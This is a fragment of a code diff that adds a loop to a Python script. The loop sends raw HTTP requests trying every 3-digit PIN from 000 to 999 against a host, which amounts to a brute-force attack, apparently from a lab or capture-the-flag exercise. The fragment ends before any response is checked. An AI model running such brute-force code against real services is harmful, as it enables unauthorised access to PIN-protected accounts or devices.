@@ -18,10 +18,15 @@ def send_pin(pin):
         f"\r\n"
         f"{body}" 
     )
-    
     # Create a new socket for each request
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
         s.connect((HOST, PORT)) 
         s.sendall(request.encode()) 
         response = s.recv(4096) 
         return response.decode() 
+    
+for pin in range(1000): # Loop through all possible 3-digit PINs (000 to 999)
+    pin_str = f"{pin:03d}" # Format the pin as a 3-digit string
+    print(f"Trying pin {pin_str}") # Print the current pin being tried
+    response = send_pin(pin_str) 
+    
